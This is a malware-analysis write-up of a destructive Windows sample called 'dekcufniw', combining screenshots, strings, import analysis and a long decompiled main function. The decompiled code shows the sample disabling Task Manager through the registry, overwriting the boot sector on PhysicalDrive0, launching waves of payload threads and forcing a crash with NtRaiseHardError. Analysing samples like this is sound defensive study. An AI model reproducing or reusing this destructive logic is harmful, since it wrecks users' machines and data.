Malware type -
<br>

# Initial Detonation
----
![[Pasted image 20230821222515.png]]
on clicking yes,
![[Pasted image 20230821222531.png]]
on clicking yes,
![[Pasted image 20230821222550.png]]
![[Pasted image 20230821222559.png]]
![[Pasted image 20230821222620.png]]
![[Pasted image 20230821222631.png]]
![[Pasted image 20230821222643.png]]
A lot of processes open up.
![[Pasted image 20230821222757.png]]
![[Pasted image 20230821222927.png]]
The screen starts blurring.
This process continues until all memory of the system runs out.
<br>

# Static Analysis
----
### Strings -

![[Pasted image 20230821223514.png]]

Interesting Strings- 
```
C:\Users\
\Desktop\
\projects\dekcufniw\Release\dekcufniw.pdb
Software\Microsoft\Windows\CurrentVersion\Policies\System
DisableTaskMgr
\\.\PhysicalDrive0
```

### IAT Analysis

![[Pasted image 20230821233915.png]]
This is a PE file for windows.
![[Pasted image 20230821234134.png]]
The malware is unpacked due to values of <span style="color:#047c3a">virtual size</span> and <span style="color:#047c3a">size of raw data</span> being almost the same.
![[Pasted image 20230821234305.png]]
Large amounts of imports confirm that.

### Pestudio

![[Pasted image 20230821234404.png]]
![[Pasted image 20230821234425.png]]
2 malware indicators have been flagged by pestudio.

![[Pasted image 20230821234505.png]]
Malicious imports -
![[Pasted image 20230821234534.png]]
![[Pasted image 20230821234552.png]]
Now opening in cutter -

The decompiled main function -
```
int32_t main (void) {

PHKEY lpNumberOfBytesWritten;

int32_t var_8h;

eax = *(data.00415004);

eax ^= ebp;

esi = imp.MessageBoxW;

eax = void (*esi)(uint32_t, uint32_t, char*, uint32_t, uint32_t) (0, eax, "Sure? - deckufniw.exe", 0x34, esi);

if (eax == 6) {

eax = void (*esi)(uint32_t, char*, char*, uint32_t) (0, "SURE? YOU WILL DESTROY YOUR MACHINE BY PRESSING YES!", "SURE?!", 0x34);

if (eax != 6) {

goto label_0;

}

RegCreateKeyExW (0x80000001, "Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, 0, 0, 0xf013f, 0, lpNumberOfBytesWritten, 0, edi, ebx);

RegSetValueExW (lpNumberOfBytesWritten, "DisableTaskMgr", 0, 4, 1, 4);

eax = CreateFileW ("\\.\PhysicalDrive0", 0x10000000, 3, 0, 3, 0, 0);

esi = eax;

WriteFile (esi, data.00412ea8, 0x200, lpNumberOfBytesWritten, 0);

CloseHandle (esi);

ebx = imp.CreateThread;

void (*ebx)(uint32_t, uint32_t, uint32_t, uint32_t, uint32_t, uint32_t) (0, 0, data.00402e40, 0, 0, 0);

void (*ebx)(uint32_t, uint32_t, uint32_t, uint32_t, uint32_t, uint32_t) (0, 0, data.00402fe0, 0, 0, 0);

void (*ebx)(uint32_t, uint32_t, uint32_t, uint32_t, uint32_t, uint32_t) (0, 0, section..text, 0, 0, 0);

void (*ebx)(uint32_t, uint32_t, uint32_t, uint32_t, uint32_t, uint32_t) (0, 0, data.00401ee0, 0, 0, 0);

void (*ebx)(uint32_t, uint32_t, uint32_t, uint32_t, uint32_t, uint32_t) (0, 0, data.00401e60, 0, 0, 0);

eax = void (*ebx)(uint32_t, uint32_t, uint32_t, uint32_t, uint32_t, uint32_t) (0, 0, data.00402350, 0, 0, 0);

esi = eax;

Sleep (0x7530);

edi = imp.TerminateThread;

void (*edi)(uint32_t, uint32_t) (esi, 0);

ebx = imp.InvalidateRect;

void (*ebx)(uint32_t, uint32_t, uint32_t) (0, 0, 0);

eax = imp.CreateThread;

eax = void (*eax)(uint32_t, uint32_t, uint32_t, uint32_t, uint32_t, uint32_t) (0, 0, data.004024d0, 0, 0, 0);

esi = eax;

Sleep (0x7530);

void (*edi)(uint32_t, uint32_t) (esi, 0);

void (*ebx)(uint32_t, uint32_t, uint32_t) (0, 0, 0);

esi = imp.CreateThread;

eax = void (*esi)(uint32_t, uint32_t, uint32_t, uint32_t, uint32_t, uint32_t) (0, 0, data.00402350, 0, 0, 0);

edi = eax;

eax = void (*esi)(uint32_t, uint32_t, uint32_t, uint32_t, uint32_t, uint32_t) (0, 0, data.004024d0, 0, 0, 0);

esi = eax;

Sleep (0xafc8);

edi = imp.TerminateThread;

void (*edi)(uint32_t, uint32_t) (edi, 0);

void (*edi)(uint32_t, uint32_t) (esi, 0);

void (*ebx)(uint32_t, uint32_t, uint32_t) (0, 0, 0);

eax = imp.CreateThread;

eax = void (*eax)(uint32_t, uint32_t, uint32_t, uint32_t, uint32_t, uint32_t) (0, 0, data.004027a0, 0, 0, 0);

esi = eax;

Sleep (0x7530);

void (*edi)(uint32_t, uint32_t) (esi, 0);

void (*ebx)(uint32_t, uint32_t, uint32_t) (0, 0, 0);

esi = imp.CreateThread;

eax = void (*esi)(uint32_t, uint32_t, uint32_t, uint32_t, uint32_t, uint32_t) (0, 0, data.00402350, 0, 0, 0);

ebx = eax;

eax = void (*esi)(uint32_t, uint32_t, uint32_t, uint32_t, uint32_t, uint32_t) (0, 0, data.004024d0, 0, 0, 0);

edi = eax;

eax = void (*esi)(uint32_t, uint32_t, uint32_t, uint32_t, uint32_t, uint32_t) (0, 0, data.004027a0, 0, 0, 0);

esi = eax;

Sleep (0xafc8);

TerminateThread (ebx, 0);

edi = imp.TerminateThread;

void (*edi)(uint32_t, uint32_t) (edi, 0);

void (*edi)(uint32_t, uint32_t) (esi, 0);

ebx = imp.InvalidateRect;

void (*ebx)(uint32_t, uint32_t, uint32_t) (0, 0, 0);

eax = imp.CreateThread;

eax = void (*eax)(uint32_t, uint32_t, uint32_t, uint32_t, uint32_t, uint32_t) (0, 0, data.00402660, 0, 0, 0);

esi = eax;

Sleep (0x7530);

void (*edi)(uint32_t, uint32_t) (esi, 0);

void (*ebx)(uint32_t, uint32_t, uint32_t) (0, 0, 0);

eax = CreateThread (0, 0, data.004028c0, 0, 0, 0);

esi = eax;

Sleep (0x7530);

void (*edi)(uint32_t, uint32_t) (esi, 0);

void (*ebx)(uint32_t, uint32_t, uint32_t) (0, 0, 0);

esi = imp.CreateThread;

eax = void (*esi)(uint32_t, uint32_t, uint32_t, uint32_t, uint32_t, uint32_t) (0, 0, data.00402660, 0, 0, 0);

edi = eax;

eax = void (*esi)(uint32_t, uint32_t, uint32_t, uint32_t, uint32_t, uint32_t) (0, 0, data.004028c0, 0, 0, 0);

esi = eax;

Sleep (0x7530);

edi = imp.TerminateThread;

void (*edi)(uint32_t, uint32_t) (edi, 0);

void (*edi)(uint32_t, uint32_t) (esi, 0);

void (*ebx)(uint32_t, uint32_t, uint32_t) (0, 0, 0);

ebx = imp.CreateThread;

void (*ebx)(uint32_t, uint32_t, uint32_t, uint32_t, uint32_t, uint32_t) (0, 0, data.00402350, 0, 0, 0);

void (*ebx)(uint32_t, uint32_t, uint32_t, uint32_t, uint32_t, uint32_t) (0, 0, data.004024d0, 0, 0, 0);

void (*ebx)(uint32_t, uint32_t, uint32_t, uint32_t, uint32_t, uint32_t) (0, 0, data.004027a0, 0, 0, 0);

void (*ebx)(uint32_t, uint32_t, uint32_t, uint32_t, uint32_t, uint32_t) (0, 0, data.00402660, 0, 0, 0);

void (*ebx)(uint32_t, uint32_t, uint32_t, uint32_t, uint32_t, uint32_t) (0, 0, data.004028c0, 0, 0, 0);

esi = imp.Sleep;

void (*esi)(uint32_t) (KERNEL32.dll_Sleep);

void (*ebx)(uint32_t, uint32_t, uint32_t, uint32_t, uint32_t, uint32_t) (0, 0, data.00402ce0, 0, 0, 0);

void (*esi)(uint32_t) (0x3a98);

void (*ebx)(uint32_t, uint32_t, uint32_t, uint32_t, uint32_t, uint32_t) (0, 0, data.00402a50, 0, 0, 0);

void (*esi)(uint32_t) (0x7530);

eax = GetModuleHandleW ("ntdll.dll", 0);

if (eax != 0) {

eax = GetProcAddress (eax, "NtRaiseHardError");

void (*eax)(uint32_t, uint32_t, uint32_t, uint32_t, uint32_t, uint32_t) (0xdeaddead, 0, 0, 0, 6, lpNumberOfBytesWritten);

}

void (*esi)(uint32_t) (0xffffffffffffffff);

ecx = var_8h;

ecx ^= ebp;

fcn_00403197 ();

return eax;

}

label_0:

ecx = var_8h;

eax = 1;

ecx ^= ebp;

fcn_00403197 ();

return eax;

}
```
![[Pasted image 20230821235210.png]]
![[Pasted image 20230821235229.png]]
![[Pasted image 20230821235248.png]]
![[Pasted image 20230821235302.png]]
![[Pasted image 20230821235316.png]]

<br>

# Dynamic Analysis
----
### Network based indicators -

![[Pasted image 20230821234913.png]]
A lot of requests pop up due to a lot of apps being opened by the malware.

### Host Based Indicators -

in <span style="color:#ffff00">procmon</span> -
![[Pasted image 20230822001908.png]]
There doesn't seem to be any outlier processes.
<br>

# Conclusion
---
This malware opens up a ton of apps and crashes the machine. Upon restart , the same process is continued.